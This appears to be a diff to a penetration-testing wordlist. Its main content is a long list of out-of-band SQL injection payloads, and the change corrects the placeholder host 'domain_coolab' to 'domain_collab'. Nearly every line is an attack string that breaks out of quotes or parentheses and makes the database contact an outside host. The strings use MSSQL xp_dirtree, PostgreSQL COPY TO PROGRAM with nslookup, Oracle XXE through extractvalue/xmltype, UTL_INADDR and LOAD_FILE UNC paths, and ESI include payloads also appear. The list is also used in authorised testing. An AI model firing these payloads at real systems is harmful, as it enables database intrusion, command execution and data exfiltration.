@@ -122,185 +122,185 @@ LOAD_FILE('\\\\domain_collab\\a')
 SELECT ... INTO OUTFILE '\\\\domain_collab\a'
 <esi:include src="http://domain_collab/"/>
 <esi:include src="http://vps_ip/"/>
-' exec master..xp_dirtree '//domain_coolab/a'--
-' copy (SELECT '') to program 'nslookup domain_coolab'--
-' LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-'UNION SELECT UTL_INADDR.get_host_address('domain_coolab')--
-'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-'||SELECT UTL_INADDR.get_host_address('domain_coolab')--
-'||exec master..xp_dirtree '//domain_coolab/a'--
-'||copy (SELECT '') to program 'nslookup domain_coolab'--
-'||LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-'; SELECT UTL_INADDR.get_host_address('domain_coolab')--
-'; exec master..xp_dirtree '//domain_coolab/a'--
-'; copy (SELECT '') to program 'nslookup domain_coolab'--
-'; LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-') SELECT UTL_INADDR.get_host_address('domain_coolab')--
-') exec master..xp_dirtree '//domain_coolab/a'--
-') copy (SELECT '') to program 'nslookup domain_coolab'--
-') LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-')) SELECT UTL_INADDR.get_host_address('domain_coolab')--
-')) exec master..xp_dirtree '//domain_coolab/a'--
-')) copy (SELECT '') to program 'nslookup domain_coolab'--
-')) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-') OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-') OR exec master..xp_dirtree '//domain_coolab/a'--
-') OR copy (SELECT '') to program 'nslookup domain_coolab'--
-') OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-')) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-')) OR exec master..xp_dirtree '//domain_coolab/a'--
-')) OR copy (SELECT '') to program 'nslookup domain_coolab'--
-')) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-') AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-') AND exec master..xp_dirtree '//domain_coolab/a'--
-') AND copy (SELECT '') to program 'nslookup domain_coolab'--
-') AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-')) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-')) AND exec master..xp_dirtree '//domain_coolab/a'--
-')) AND copy (SELECT '') to program 'nslookup domain_coolab'--
-')) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-' OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-' OR exec master..xp_dirtree '//domain_coolab/a'--
-' OR copy (SELECT '') to program 'nslookup domain_coolab'--
-' OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-' AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-' AND exec master..xp_dirtree '//domain_coolab/a'--
-' AND copy (SELECT '') to program 'nslookup domain_coolab'--
-' AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-" SELECT UTL_INADDR.get_host_address('domain_coolab')--
-" exec master..xp_dirtree '//domain_coolab/a'--
-" copy (SELECT '') to program 'nslookup domain_coolab'--
-" LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-"UNION SELECT UTL_INADDR.get_host_address('domain_coolab')--
-"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-"||SELECT UTL_INADDR.get_host_address('domain_coolab')--
-"||exec master..xp_dirtree '//domain_coolab/a'--
-"||copy (SELECT '') to program 'nslookup domain_coolab'--
-"||LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-"; SELECT UTL_INADDR.get_host_address('domain_coolab')--
-"; exec master..xp_dirtree '//domain_coolab/a'--
-"; copy (SELECT '') to program 'nslookup domain_coolab'--
-"; LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-") SELECT UTL_INADDR.get_host_address('domain_coolab')--
-") exec master..xp_dirtree '//domain_coolab/a'--
-") copy (SELECT '') to program 'nslookup domain_coolab'--
-") LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-")) SELECT UTL_INADDR.get_host_address('domain_coolab')--
-")) exec master..xp_dirtree '//domain_coolab/a'--
-")) copy (SELECT '') to program 'nslookup domain_coolab'--
-")) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-") OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-") OR exec master..xp_dirtree '//domain_coolab/a'--
-") OR copy (SELECT '') to program 'nslookup domain_coolab'--
-") OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-")) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-")) OR exec master..xp_dirtree '//domain_coolab/a'--
-")) OR copy (SELECT '') to program 'nslookup domain_coolab'--
-")) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-") AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-") AND exec master..xp_dirtree '//domain_coolab/a'--
-") AND copy (SELECT '') to program 'nslookup domain_coolab'--
-") AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-")) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-")) AND exec master..xp_dirtree '//domain_coolab/a'--
-")) AND copy (SELECT '') to program 'nslookup domain_coolab'--
-")) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-" OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-" OR exec master..xp_dirtree '//domain_coolab/a'--
-" OR copy (SELECT '') to program 'nslookup domain_coolab'--
-" OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-" AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-" AND exec master..xp_dirtree '//domain_coolab/a'--
-" AND copy (SELECT '') to program 'nslookup domain_coolab'--
-" AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-OR exec master..xp_dirtree '//domain_coolab/a'--
-OR copy (SELECT '') to program 'nslookup domain_coolab'--
-OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l' FROM dual--
-AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-AND exec master..xp_dirtree '//domain_coolab/a'--
-AND copy (SELECT '') to program 'nslookup domain_coolab'--
-AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-` SELECT UTL_INADDR.get_host_address('domain_coolab')--
-` exec master..xp_dirtree '//domain_coolab/a'--
-` copy (SELECT '') to program 'nslookup domain_coolab'--
-` LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`UNION SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`||SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`||exec master..xp_dirtree '//domain_coolab/a'--
-`||copy (SELECT '') to program 'nslookup domain_coolab'--
-`||LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`; SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`; exec master..xp_dirtree '//domain_coolab/a'--
-`; copy (SELECT '') to program 'nslookup domain_coolab'--
-`; LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`) SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`) exec master..xp_dirtree '//domain_coolab/a'--
-`) copy (SELECT '') to program 'nslookup domain_coolab'--
-`) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`)) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`)) SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`)) exec master..xp_dirtree '//domain_coolab/a'--
-`)) copy (SELECT '') to program 'nslookup domain_coolab'--
-`)) LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`) OR exec master..xp_dirtree '//domain_coolab/a'--
-`) OR copy (SELECT '') to program 'nslookup domain_coolab'--
-`) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`)) OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`)) OR exec master..xp_dirtree '//domain_coolab/a'--
-`)) OR copy (SELECT '') to program 'nslookup domain_coolab'--
-`)) OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`) AND exec master..xp_dirtree '//domain_coolab/a'--
-`) AND copy (SELECT '') to program 'nslookup domain_coolab'--
-`) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`)) AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-`)) AND exec master..xp_dirtree '//domain_coolab/a'--
-`)) AND copy (SELECT '') to program 'nslookup domain_coolab'--
-`)) AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-` OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-` OR SELECT UTL_INADDR.get_host_address('domain_coolab')--
-` OR exec master..xp_dirtree '//domain_coolab/a'--
-` OR copy (SELECT '') to program 'nslookup domain_coolab'--
-` OR LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
-` AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-` AND SELECT UTL_INADDR.get_host_address('domain_coolab')--
-` AND exec master..xp_dirtree '//domain_coolab/a'--
-` AND copy (SELECT '') to program 'nslookup domain_coolab'--
-` AND LOAD_FILE('\\\\domain_coolab\\a') SELECT ... INTO OUTFILE '\\\\domain_coolab\a'--
+' exec master..xp_dirtree '//domain_collab/a'--
+' copy (SELECT '') to program 'nslookup domain_collab'--
+' LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+'||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'||SELECT UTL_INADDR.get_host_address('domain_collab')--
+'||exec master..xp_dirtree '//domain_collab/a'--
+'||copy (SELECT '') to program 'nslookup domain_collab'--
+'||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+'; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'; SELECT UTL_INADDR.get_host_address('domain_collab')--
+'; exec master..xp_dirtree '//domain_collab/a'--
+'; copy (SELECT '') to program 'nslookup domain_collab'--
+'; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') SELECT UTL_INADDR.get_host_address('domain_collab')--
+') exec master..xp_dirtree '//domain_collab/a'--
+') copy (SELECT '') to program 'nslookup domain_collab'--
+') LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+')) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+')) SELECT UTL_INADDR.get_host_address('domain_collab')--
+')) exec master..xp_dirtree '//domain_collab/a'--
+')) copy (SELECT '') to program 'nslookup domain_collab'--
+')) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+') OR exec master..xp_dirtree '//domain_collab/a'--
+') OR copy (SELECT '') to program 'nslookup domain_collab'--
+') OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+')) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+')) OR exec master..xp_dirtree '//domain_collab/a'--
+')) OR copy (SELECT '') to program 'nslookup domain_collab'--
+')) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+') AND exec master..xp_dirtree '//domain_collab/a'--
+') AND copy (SELECT '') to program 'nslookup domain_collab'--
+') AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+')) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+')) AND exec master..xp_dirtree '//domain_collab/a'--
+')) AND copy (SELECT '') to program 'nslookup domain_collab'--
+')) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+' OR exec master..xp_dirtree '//domain_collab/a'--
+' OR copy (SELECT '') to program 'nslookup domain_collab'--
+' OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+' AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+' AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+' AND exec master..xp_dirtree '//domain_collab/a'--
+' AND copy (SELECT '') to program 'nslookup domain_collab'--
+' AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+" SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+" SELECT UTL_INADDR.get_host_address('domain_collab')--
+" exec master..xp_dirtree '//domain_collab/a'--
+" copy (SELECT '') to program 'nslookup domain_collab'--
+" LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+"||SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"||SELECT UTL_INADDR.get_host_address('domain_collab')--
+"||exec master..xp_dirtree '//domain_collab/a'--
+"||copy (SELECT '') to program 'nslookup domain_collab'--
+"||LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+"; SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"; SELECT UTL_INADDR.get_host_address('domain_collab')--
+"; exec master..xp_dirtree '//domain_collab/a'--
+"; copy (SELECT '') to program 'nslookup domain_collab'--
+"; LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+") SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+") SELECT UTL_INADDR.get_host_address('domain_collab')--
+") exec master..xp_dirtree '//domain_collab/a'--
+") copy (SELECT '') to program 'nslookup domain_collab'--
+") LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+")) SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+")) SELECT UTL_INADDR.get_host_address('domain_collab')--
+")) exec master..xp_dirtree '//domain_collab/a'--
+")) copy (SELECT '') to program 'nslookup domain_collab'--
+")) LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+") OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+") OR exec master..xp_dirtree '//domain_collab/a'--
+") OR copy (SELECT '') to program 'nslookup domain_collab'--
+") OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+")) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+")) OR exec master..xp_dirtree '//domain_collab/a'--
+")) OR copy (SELECT '') to program 'nslookup domain_collab'--
+")) OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+") AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+") AND exec master..xp_dirtree '//domain_collab/a'--
+") AND copy (SELECT '') to program 'nslookup domain_collab'--
+") AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+")) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+")) AND exec master..xp_dirtree '//domain_collab/a'--
+")) AND copy (SELECT '') to program 'nslookup domain_collab'--
+")) AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+" OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+" OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+" OR exec master..xp_dirtree '//domain_collab/a'--
+" OR copy (SELECT '') to program 'nslookup domain_collab'--
+" OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+" AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+" AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+" AND exec master..xp_dirtree '//domain_collab/a'--
+" AND copy (SELECT '') to program 'nslookup domain_collab'--
+" AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+OR exec master..xp_dirtree '//domain_collab/a'--
+OR copy (SELECT '') to program 'nslookup domain_collab'--
+OR LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l' FROM dual--
+AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+AND exec master..xp_dirtree '//domain_collab/a'--
+AND copy (SELECT '') to program 'nslookup domain_collab'--
+AND LOAD_FILE('\\\\domain_collab\\a') SELECT ... INTO OUTFILE '\\\\domain_collab\a'--
+` SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+` SELECT UTL_INADDR.get_host_address('domain_collab')--
+` exec master..xp_dirtree '//domain_collab/a'--
